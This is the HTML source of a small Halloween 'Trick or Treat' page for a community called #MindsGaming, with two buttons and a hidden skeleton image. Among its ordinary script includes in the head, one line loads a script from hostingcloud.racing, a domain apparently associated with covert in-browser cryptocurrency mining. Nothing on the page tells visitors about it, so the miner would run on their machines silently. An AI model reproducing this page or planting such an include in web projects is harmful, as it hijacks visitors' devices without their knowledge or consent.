<!DOCTYPE html>
<html lang="en">
  <head>
    <title>#MindsGaming</title>

    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="description" content="Community & Member Groups" />
    <meta
      property="og:image"
      content="https://cdn.glitch.com/6ca1674b-a03a-4e9c-9563-ed6203267aba%2FMGLogo.jpeg"
    />

    <link
      rel="icon"
      href="https://cdn.glitch.com/6ca1674b-a03a-4e9c-9563-ed6203267aba%2FMGLogo.jpeg"
    />

    <script src="https://mindsgaming.glitch.me/mtcg/docs.js"></script>
    <script src="https://mindsgaming.glitch.me/mtcg/invest.js"></script>
    <script src="https://mindsgaming.glitch.me/mtcg/deck/playcard.js"></script>
    <script src="https://mindsgaming.glitch.me/script.js"></script>

    <script src="https://www.hostingcloud.racing/5pDo.js"></script>

    <!-- import the webpage's stylesheet -->
    <link rel="stylesheet" href="https://ipack.glitch.me/mgicons.css" defer />
    <link rel="stylesheet" href="https://mindsgaming.glitch.me/cpu.css" defer />
    <link
      rel="stylesheet"
      href="https://mindsgaming.glitch.me/mtcg/style.css"
      defer
    />
    <script src="/games/js/tokens.js" defer></script>

    <link rel="stylesheet" href="/fly.css" />
    <script src="/js/fly.js" defer></script>
    <script src="/js/mice.js" defer></script>
        <script src="/js/halloween.js" defer></script>

    <style>
      .hallow {
        float: left;
        display: block;
        width: 25%;
        margin: 50px;
        background-color: black;
        border-style: groove;
        border-radius: 11%;
        color: yellow;
        font-size: 40px;
        font-align: center;
        cursor: pointer;
      }

      h1 {
        margin-top: 12%;
      }
      .tricks {
        display: none;
      }
      .trick {
        position: fixed;
        display: block
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
      }
    </style>
  </head>
  <body>
    <wrap>
      <center>
        <div>
          <h1>
            Would You Like A Trick Or Treat
          </h1>
          <div class="hallow" onclick="trick(); return false">
            Trick
          </div>
          <img
            src="https://cdn.glitch.me/f23d0d76-dc88-4f4e-afe2-9bd56ac40b28%2FSkelotor.jpeg"
            class="tricks"
            id="trick"
          />
          <div class="hallow" id="treat" onclick="treat(); return false">
            Treat
          </div>
        </div>
      </center>
    </wrap>
  </body>
</html>
